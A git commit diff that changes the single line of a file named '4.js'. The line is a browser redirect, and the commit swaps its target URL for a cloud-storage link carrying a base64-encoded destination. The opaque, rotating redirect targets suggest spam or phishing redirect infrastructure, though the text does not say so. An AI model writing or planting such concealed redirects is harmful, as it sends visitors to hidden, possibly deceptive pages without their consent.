7ff7dac5c1eedd9eed64c394303971582d233c82
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-12-01 15:36:37 +0800

    Update 4.js

--- 4.js
+++ 4.js
@@ -1,1 +1,1 @@
-window.location.href='https://glzx.yonghui.cn:8886/image/newvss/cooperation/20231102/7c34b37512ab4b8c84aa9d09a3de8bcd/8ey29buegy52.xhtml?id=QhXZzbtjfTI57sEDPe641Yp9oxHBiWnS'
+window.location.href='http://s13-video.s3.cn-east-2.jdcloud-oss.com/411?d=cjgua2ZnaHl1ZGUxMzkuY258MTYyNnwveC8xNjI2L3JnaTY='
